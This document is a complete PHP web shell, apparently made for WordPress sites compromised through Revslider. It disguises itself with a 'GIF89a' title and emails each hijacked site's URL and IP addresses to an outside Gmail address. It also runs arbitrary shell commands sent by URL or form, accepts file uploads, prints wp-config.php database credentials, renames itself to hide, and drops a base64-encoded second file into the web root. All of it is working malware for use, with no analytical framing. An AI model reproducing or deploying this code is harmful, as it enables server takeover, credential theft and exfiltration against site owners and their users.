<?php
set_time_limit(0);
error_reporting(0);
if (!isset($_SESSION['bajak']))	{
$visitcount = 0;
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$body = "Revslider Shells jalanG \n$web$inj";
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE = OFF";}
else {$security= "SAFE_MODE = ON";};
$serper=gethostbyname($_SERVER['SERVER_ADDR']);
$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
mail("jalangsaya@gmail.com", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
$_SESSION['bajak'] = 0;
}
else {$_SESSION['bajak']++;};
if(isset($_GET['pindah'])){
$source = $_SERVER['SCRIPT_FILENAME'];
$desti = $_SERVER['DOCUMENT_ROOT'].'/'.'wp-info.php';
rename($source, $desti);
}
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE : OFF jalanG @ irc.dancok.org";}
else {$security= "SAFE_MODE : ON jalanG @ irc.dancok.org";}
echo "<title>GIF89a</title><br>";
echo "<font size=3 color=#FFF5EE>Ketika Pather Jadi Bangsat !<br>";
echo "<font size=3 color=#FFF5EE>Server : irc.dancok.org 7000<br>";
echo "<font size=3 color=#FFF5EE>Status : sCanneR ON<br><br>";
echo "<font size=2 color=#FF0000><b>".$security."</b><br>";
$cur_user="(".get_current_user().")";
echo "<font size=2 color=#FF0000><b>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</b><br>";
echo "<font size=2 color=#FF0000><b>Uname : ".php_uname()."</b><br>";
function pwd() {
$cwd = getcwd();
if($u=strrpos($cwd,'/')){
if($u!=strlen($cwd)-1){
return $cwd.'/';}
else{return $cwd;};
}
elseif($u=strrpos($cwd,'\\')){
if($u!=strlen($cwd)-1){
return $cwd.'\\';}
else{return $cwd;};
};
}
if(isset($_GET['rudy'])){
echo '<form method="POST" action=""><font size=2 color=#FF0000><b>Command</b><br><input type="text" name="cmd"><input type="Submit" name="command" value="eXcute"></form>';
echo '<form enctype="multipart/form-data" action method=POST><font size=2 color=#FF0000><b>Upload File</b></font><br><input type=hidden name="submit"><input type=file name="userfile" size=28><br><font size=2 color=#FF0000><b>New name: </b></font><input type=text size=15 name="newname" class=ta><input type=submit class="bt" value="Upload"></form>';
if(isset($_POST['submit'])){
$uploaddir = pwd();
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);
if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){
echo "Upload Failed";
} else { echo "Upload Success to ".$uploaddir.$name." :D "; }
}
}
$filez = '';
$pathz = $_SERVER['DOCUMENT_ROOT'].'/'.'errors.php';
if(file_exists($pathz)) @unlink($pathz);
$contentz = base64_decode($filez);
$txtz = fopen($pathz,"a+");
fwrite($txtz, $contentz);
fclose($txtz);
$file3 = 'PD9waHAgDQoNCmlmIChiYXNlbmFtZShfX0ZJTEVfXykgPT0gYmFzZW5hbWUoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pKQ0Kew0KICAgIGV4aXQoMCk7DQp9DQoNCmVjaG8gJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+JzsNCg0KPz4NCg0KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIGxhbmc9ImVuLVVTIiB4bWw6bGFuZz0iZW4tVVMiPg0KPGhlYWQ+DQogIDx0aXRsZT5qYWxhbkc8L3RpdGxlPg0KICA8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSJzdHlsZS5jc3MiIHRpdGxlPSJEZWZhdWx0IFRoZW1lIiBtZWRpYT0iYWxsIiAvPg0KICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KLnN0eWxlMSB7DQoJZm9udC1mYW1pbHk6IFZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7DQoJZm9udC1zaXplOiAxMnB4Ow0KfQ0KYTpsaW5rIHsNCgljb2xvcjogIzAwRkYwMDsNCgl0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphOnZpc2l0ZWQgew0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCgljb2xvcjogIzAwRkYwMDsNCn0NCmE6aG92ZXIgew0KCXRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOw0KCWNvbG9yOiAjRkZGRjAwOw0KfQ0KYTphY3RpdmUgew0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCgljb2xvcjogI0ZGRkYwMDsNCn0NCi0tPg0KICA8L3N0eWxlPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMSIgLz48L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSIjMDAwMDAwIiB0ZXh0PSIjMDBGRjAwIiBvbmxvYWQ9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhZGRyZXNzX2JveCcpLmZvY3VzKCkiPg0KPGRpdiBpZD0iY29udGFpbmVyIj4NCiAgPGgxIGlkPSJ0aXRsZSI+PGNlbnRlcj4NCiAgICA8dT4uLjo6WyBqYWxhbkcgXTo6Li48L3U+DQogIDwvY2VudGVyPjwvaDE+DQo8ZGl2IGNsYXNzPSJzdHlsZTEiIGlkPSJMYXllcjEiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTsgd2lkdGg6NTA2cHg7IGhlaWdodDo0NjdweDsgei1pbmRleDoxOyBsZWZ0OiAzNTNweDsgdG9wOiA5NHB4OyI+DQoNCiAgPHVsIGlkPSJuYXZpZ2F0aW9uIj4NCiAgICA8bGk+PGEgaHJlZj0iPD9waHAgZWNobyAkR0xPQkFMU1snX3NjcmlwdF9iYXNlJ10gPz4iPlVSTCBGb3JtPC9hPjwvbGk+DQogICAgPGxpPjxhIGhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoJ2Nvb2tpZSBtYW5hZ21lbnQgaGFzIG5vdCBiZWVuIGltcGxlbWVudGVkIHlldCcpIj5NYW5hZ2UgQ29va2llczwvYT48L2xpPg0KICA8L3VsPg0KPD9waHANCg0Kc3dpdGNoICgkZGF0YVsnY2F0ZWdvcnknXSkNCnsNCiAgICBjYXNlICdhdXRoJzoNCj8+DQogIDxkaXYgaWQ9ImF1dGgiPjxwPg0KICA8Yj5FbnRlciB5b3VyIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBmb3IgIjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkZGF0YVsncmVhbG0nXSkgPz4iIG9uIDw/cGhwIGVjaG8gJEdMT0JBTFNbJ191cmxfcGFydHMnXVsnaG9zdCddID8+PC9iPg0KICA8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCiAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSI8P3BocCBlY2hvICRHTE9CQUxTWydfY29uZmlnJ11bJ2Jhc2ljX2F1dGhfdmFyX25hbWUnXSA/PiIgdmFsdWU9Ijw/cGhwIGVjaG8gYmFzZTY0X2VuY29kZSgkZGF0YVsncmVhbG0nXSkgPz4iIC8+DQogICAgPGxhYmVsPlVzZXJuYW1lIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgdmFsdWU9IiIgLz48L2xhYmVsPiA8bGFiZWw+UGFzc3dvcmQgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgdmFsdWU9IiIgLz48L2xhYmVsPiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iIC8+DQogIDwvZm9ybT48L3A+PC9kaXY+DQo8P3BocA0KICAgICAgICBicmVhazsNCiAgICBjYXNlICdlcnJvcic6DQogICAgICAgIGVjaG8gJzxkaXYgaWQ9ImVycm9yIj48cD4nOw0KICAgICAgICANCiAgICAgICAgc3dpdGNoICgkZGF0YVsnZ3JvdXAnXSkNCiAgICAgICAgew0KICAgICAgICAgICAgY2FzZSAndXJsJzoNCiAgICAgICAgICAgICAgICBlY2hvICc8Yj5VUkwgRXJyb3IgKCcgLiAkZGF0YVsnZXJyb3InXSAuICcpPC9iPjogJzsNCiAgICAgICAgICAgICAgICBzd2l0Y2ggKCRkYXRhWyd0eXBlJ10pDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBjYXNlICdpbnRlcm5hbCc6DQogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICdGYWlsZWQgdG8gY29ubmVjdCB0byB0aGUgc3BlY2lmaWVkIGhvc3QuICcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gJ1Bvc3NpYmxlIHByb2JsZW1zIGFyZSB0aGF0IHRoZSBzZXJ2ZXIgd2FzIG5vdCBmb3VuZCwgdGhlIGNvbm5lY3Rpb24gdGltZWQgb3V0LCBvciB0aGUgY29ubmVjdGlvbiByZWZ1c2VkIGJ5IHRoZSBob3N0LiAnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICdUcnkgY29ubmVjdGluZyBhZ2FpbiBhbmQgY2hlY2sgaWYgdGhlIGFkZHJlc3MgaXMgY29ycmVjdC4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgJ2V4dGVybmFsJzoNCiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoJGRhdGFbJ2Vycm9yJ10pDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAxOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICdUaGUgVVJMIHlvdVwncmUgYXR0ZW1wdGluZyB0byBhY2Nlc3MgaXMgYmxhY2tsaXN0ZWQgYnkgdGhpcyBzZXJ2ZXIuIFBsZWFzZSBzZWxlY3QgYW5vdGhlciBVUkwuJzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAyOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICdUaGUgVVJMIHlvdSBlbnRlcmVkIGlzIG1hbGZvcm1lZC4gUGxlYXNlIGNoZWNrIHdoZXRoZXIgeW91IGVudGVyZWQgdGhlIGNvcnJlY3QgVVJMIG9yIG5vdC4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ3Jlc291cmNlJzoNCiAgICAgICAgICAgICAgICBlY2hvICc8Yj5SZXNvdXJjZSBFcnJvcjo8L2I+ICc7DQogICAgICAgICAgICAgICAgc3dpdGNoICgkZGF0YVsndHlwZSddKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAnZmlsZV9zaXplJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJ1RoZSBmaWxlIHlvdXIgYXJlIGF0dGVtcHRpbmcgdG8gZG93bmxvYWQgaXMgdG9vIGxhcmdlLjxiciAvPicNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gJ01heGl1bXVtIHBlcm1pc3NpYmxlIGZpbGUgc2l6ZSBpcyA8Yj4nIC4gbnVtYmVyX2Zvcm1hdCgkR0xPQkFMU1snX2NvbmZpZyddWydtYXhfZmlsZV9zaXplJ10vMTA0ODU3NiwgMikgLiAnIE1CPC9iPjxiciAvPicNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC4gJ1JlcXVlc3RlZCBmaWxlIHNpemUgaXMgPGI+JyAuIG51bWJlcl9mb3JtYXQoJEdMT0JBTFNbJ19jb250ZW50X2xlbmd0aCddLzEwNDg1NzYsIDIpIC4gJyBNQjwvYj4nOw0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgJ2hvdGxpbmtpbmcnOg0KICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAnSXQgYXBwZWFycyB0aGF0IHlvdSBhcmUgdHJ5aW5nIHRvIGFjY2VzcyBhIHJlc291cmNlIHRocm91Z2ggdGhpcyBwcm94eSBmcm9tIGEgcmVtb3RlIFdlYnNpdGUuPGJyIC8+Jw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLiAnRm9yIHNlY3VyaXR5IHJlYXNvbnMsIHBsZWFzZSB1c2UgdGhlIGZvcm0gYmVsb3cgdG8gZG8gc28uJzsNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZWNobyAnQW4gZXJyb3IgaGFzIG9jY3VyZWQgd2hpbGUgdHJ5aW5nIHRvIGJyb3dzZSB0aHJvdWdoIHRoZSBwcm94eS4gPGJyIC8+JyAuICRtZXNzYWdlIC4gJzwvcD48L2Rpdj4nOw0KICAgICAgICBicmVhazsNCn0NCj8+DQogIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddID8+Ij4NCiAgICA8dWwgaWQ9ImZvcm0iPg0KICAgICAgPGxpIGlkPSJhZGRyZXNzX2JhciI+PGxhYmVsPldlYiBBZGRyZXNzIDxpbnB1dCBpZD0iYWRkcmVzc19ib3giIHR5cGU9InRleHQiIG5hbWU9Ijw/cGhwIGVjaG8gJEdMT0JBTFNbJ19jb25maWcnXVsndXJsX3Zhcl9uYW1lJ10gPz4iIHZhbHVlPSI8P3BocCBlY2hvIGlzc2V0KCRHTE9CQUxTWydfdXJsJ10pID8gaHRtbHNwZWNpYWxjaGFycygkR0xPQkFMU1snX3VybCddKSA6ICcnID8+IiBvbmZvY3VzPSJ0aGlzLnNlbGVjdCgpIiAvPjwvbGFiZWw+IDxpbnB1dCBpZD0iZ28iIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkdvIiAvPjwvbGk+DQogICAgICA8P3BocA0KICAgICAgDQogICAgICBmb3JlYWNoICgkR0xPQkFMU1snX2ZsYWdzJ10gYXMgJGZsYWdfbmFtZSA9PiAkZmxhZ192YWx1ZSkNCiAgICAgIHsNCiAgICAgICAgICBpZiAoISRHTE9CQUxTWydfZnJvemVuX2ZsYWdzJ11bJGZsYWdfbmFtZV0pDQogICAgICAgICAgew0KICAgICAgICAgICAgICBlY2hvICc8bGkgY2xhc3M9Im9wdGlvbiI+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iJyAuICRHTE9CQUxTWydfY29uZmlnJ11bJ2ZsYWdzX3Zhcl9uYW1lJ10gLiAnWycgLiAkZmxhZ19uYW1lIC4gJ10iJyAuICgkZmxhZ192YWx1ZSA/ICcgY2hlY2tlZD0iY2hlY2tlZCInIDogJycpIC4gJyAvPicgLiAkR0xPQkFMU1snX2xhYmVscyddWyRmbGFnX25hbWVdWzFdIC4gJzwvbGFiZWw+PC9saT4nIC4gIlxuIjsNCiAgICAgICAgICB9DQogICAgICB9DQogICAgICA/Pg0KICAgIDwvdWw+DQogIDwvZm9ybT4NCiAgPCEtLSBUaGUgbGVhc3QgeW91IGNvdWxkIGRvIGlzIGxlYXZlIHRoaXMgbGluayBiYWNrIGFzIGl0IGlzLiBUaGlzIHNvZnR3YXJlIGlzIHByb3ZpZGVkIGZvciBmcmVlIGFuZCBJIGFzayBub3RoaW5nIGluIHJldHVybiBleGNlcHQgdGhhdCB5b3UgbGVhdmUgdGhpcyBsaW5rIGludGFjdA0KICAgICAgIFlvdSdyZSBtb3JlIGxpa2VseSB0byByZWNpZXZlIHN1cHBvcnQgc2hvdWxkIHlvdSByZXF1aXJlIHNvbWUgaWYgSSBzZWUgYSBsaW5rIGJhY2sgaW4geW91ciBpbnN0YWxsYXRpb24gdGhhbiBpZiBub3QgLS0+DQogIDxkaXYgaWQ9ImZvb3RlciI+PGgyPmphbGFuRyBnYW50ZW5nIDwvaDE+IDw/cGhwIGVjaG8gJEdMT0JBTFNbJ192ZXJzaW9uJ10gPz48L2Rpdj4NCjwvZGl2Pg0KPC9kaXY+DQo8L2JvZHk+DQo8L2h0bWw+';
$path3 = $_SERVER['DOCUMENT_ROOT'].'/'.'wp-conf.php';
if(file_exists($path3)) @unlink($path3);
$content3 = base64_decode($file3);
$txt3 = fopen($path3,"a+");
fwrite($txt3, $content3);
fclose($txt3);
if(isset($_POST['command'])){
$cmd = $_POST['cmd'];
echo "<pre><font size=3 color=#FFF5EE>".shell_exec($cmd)."</font></pre>";
}
elseif(isset($_GET['yuni'])){
$comd = $_GET['yuni'];
echo "<pre><font size=3 color=#FFF5EE>".shell_exec($comd)."</font></pre>";
echo "<pre><font size=3 color=#FFF5EE>".shell_exec('ls -la')."</font></pre>";
}
elseif(isset($_GET['jalang'])){
$jalang = file_get_contents("wp-config.php");
echo $jalang;
}
echo "<br><br><center><font size=4 color=#FFF5EE>Dan <font size=4 color=#FF0000>Cok<font size=4 color=white>Patch <font size=4 color=#FFF5EE>Ter</center></br>";
?>
<link REL="SHORTCUT ICON" HREF="http://www.forum.romanisti-indonesia.com/Smileys/default/b_indonesia.gif"></link><body bgcolor="#000000"></body>